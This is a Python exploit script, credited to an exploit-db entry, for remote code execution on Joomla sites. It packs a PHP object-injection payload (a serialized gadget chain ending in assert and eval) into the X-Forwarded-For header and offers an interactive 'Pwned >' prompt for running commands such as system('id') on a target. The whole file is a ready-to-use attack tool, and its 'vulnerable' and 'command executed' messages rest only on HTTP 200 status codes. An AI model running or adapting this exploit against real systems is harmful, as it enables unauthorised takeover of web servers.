#!/usr/bin/python

"""
idiot people - ./Xi4u7 <3
Original Exploit - https://www.exploit-db.com/exploits/38977
"""

import requests, sys

def get_url(url, user_agent):
	headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3','X-Forwarded-For': user_agent}
	cookies = requests.get(url,headers=headers).cookies
	for _ in range(3):
		response = requests.get(url, headers=headers,cookies=cookies)
	# print(response.session)
	return response.status_code

def php_str_noquotes(data):
	encoded = ""
	for char in data:
		encoded += "chr({0}).".format(ord(char))
	return encoded[:-1]
	
def generate_payload(php_payload):
	php_payload = "eval({0})".format(php_str_noquotes(php_payload))
	terminate = '\xf0\xfd\xfd\xfd';
	exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
	injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
	exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
	exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
	return exploit_template

def main(target):
		try:
			print("\033[34m[!]\033[0m Use The PHP Function To Execute Command")
			print("\033[34m[!]\033[0m Example system('id');\n")
			cek = requests.get(target).status_code
			if cek == 200:
				print("\033[32m[+]\033[0m Maybe Vulnerable ^_^")
			else:
				print("\033[31m[-]\033[0m Not Vulnerable :(")
				exit()
			while True:
				cmd = raw_input("\033[34;1m[$]\033[0m Pwned > ")
				if cmd == "bc pl":
					pass
				elif cmd == "bc py":
					pass
				elif cmd == "bc sh":
					pass
				else:
					payload = generate_payload(cmd)
					execute = get_url(target, payload)
					if execute == 200:
						print(" |_ Maybe Command Executed! ^_^")
					else:
						print(" |_ Target Not Vulnerable")
						exit()
		except KeyboardInterrupt:
			print("\033[31m[-]\033[0m Quiting...")
			exit()
		except Exception as err:
			print("\033[31;1m[Exception]\033[0m "+str(err))
			exit()
			
try:
	target = sys.argv[1]
except:
	print("\033[33m[-]\033[0m python rce.py http://target.com/")
if target.startswith("http://"):
	main(target)
elif target.startswith("https://"):
	main(target)
else:
	kntl = "http://" + target
	main(kntl)
